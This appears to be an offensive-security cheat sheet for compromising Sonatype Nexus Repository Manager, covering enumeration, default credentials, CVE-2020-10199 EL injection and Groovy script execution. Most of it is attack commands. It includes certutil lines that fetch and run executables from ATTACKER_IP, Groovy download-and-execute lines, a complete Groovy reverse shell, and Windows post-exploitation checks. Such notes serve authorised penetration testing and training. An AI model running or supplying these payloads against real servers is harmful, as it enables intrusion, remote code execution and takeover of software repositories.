# Sonatype Nexus Repository Manager

Sonatype Nexus Repository Manager often exposes useful version details and REST endpoints before authentication. Default credentials, low-privileged access, Groovy scripting, and older EL injection bugs can lead to command execution.

## Discovery

```bash
curl -I http://TARGET:8081/
curl http://TARGET:8081/robots.txt
curl http://TARGET:8081/service/rest/swagger.json
curl http://TARGET:8081/service/rest/v1/repositories
```

Useful indicators:

```text
Server: Nexus/3.x.x-xx (OSS)
Nexus Repository Manager
/repository/
/service/
```

Nuclei is useful for passive detection, but aggressive scans can make smaller Nexus instances unstable:

```bash
nuclei -target http://TARGET:8081 -rl 5 -c 3 -as
```

The main page may disclose the exact version, for example `OSS 3.21.0-05`.

## REST Enumeration

```bash
curl http://TARGET:8081/service/rest/v1/repositories
curl http://TARGET:8081/service/rest/v1/search
curl http://TARGET:8081/service/rest/v1/search/assets
curl 'http://TARGET:8081/service/rest/v1/components?repository=REPO_NAME'
```

Probe repository names directly:

```bash
curl http://TARGET:8081/repository/
curl http://TARGET:8081/repository/maven-releases/
curl http://TARGET:8081/repository/npm-public/
```

Response wording can distinguish a missing repository from a malformed repository path.

## Default / Initial Admin Password

Nexus 3.17.0+ generates the first admin password in the data directory instead of using `admin:admin123`.

Common locations:

```text
/opt/sonatype-work/nexus3/admin.password
C:\nexus\sonatype-work\nexus3\admin.password
```

Older installs may still use:

```text
admin:admin123
nexus:nexus
```

`nexus:nexus` is listed in SecLists default credentials:

```bash
grep -r -i 'Sonatype Nexus' /usr/share/seclists/Passwords/Default-Credentials
```

Check low-privileged logins too. CVE-2020-10199 style EL injection is post-authentication and may only require any valid user.

## Authenticated EL Injection RCE

Nexus Repository Manager versions up to and including 3.21.1 are affected by a post-authentication Java Expression Language injection. Any authenticated user may be enough.

Metasploit module:

```text
exploit/linux/http/nexus_repo_manager_el_injection
```

Public PoC references:

```text
https://www.exploit-db.com/exploits/49385
https://github.com/zhzyker/CVE-2020-10199_POC-EXP
```

For Windows targets, `cmd.exe` payloads are often more reliable than PowerShell one-liners through this path. Confirm blind command execution with ICMP first:

```bash
sudo tcpdump -i tun0 icmp
```

```cmd
cmd.exe /c ping -n 4 ATTACKER_IP
```

If the PoC mangles Windows backslashes, URL-encode path separators:

```bash
CMD='cmd.exe /c certutil.exe -urlcache -f http://ATTACKER_IP:8000/shell.exe C:%2fWindows%2fTemp%2fshell.exe'
CMD='cmd.exe /c C:%2fWindows%2fTemp%2fshell.exe'
```

## Authenticated Groovy RCE

If scripts are enabled, use the script API or the admin UI to run Groovy. On Windows, a custom Groovy task can execute `cmd.exe` and spawn a callback.

Simple command execution:

```groovy
println 'cmd /c whoami'.execute().text
println 'cmd /c hostname'.execute().text
```

Download and run a payload:

```groovy
println 'cmd /c certutil -urlcache -f http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\payload.exe'.execute().text
println 'cmd /c start /b C:\\Windows\\Temp\\payload.exe'.execute().text
```

Pure Groovy reverse shell for Windows:

```groovy
String host="ATTACKER_IP";
int port=4444;
String cmd="cmd";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy();
s.close();
```

## Windows Post-Exploitation

Check the service account and install paths from the UI or shell:

```cmd
whoami
whoami /all
set
sc qc Nexus-Repository-Service
dir C:\nexus\
dir C:\nexus\sonatype-work\nexus3\
```

If the service binary or Nexus install directory is writable by low-privileged users, treat it as a Windows service-binary escalation path. See [Windows Privilege Escalation](../windows-priv-esc/win-priv-esc.md).

Nexus may run from a user profile instead of a service-style install path:

```text
C:\Users\<user>\Nexus\nexus-3.x.x-xx\
```

If the process user has `SeImpersonatePrivilege`, pivot to Potato-style escalation. See [Windows Privilege Abuse](../windows-priv-esc/windows-privilege-abuse.md).

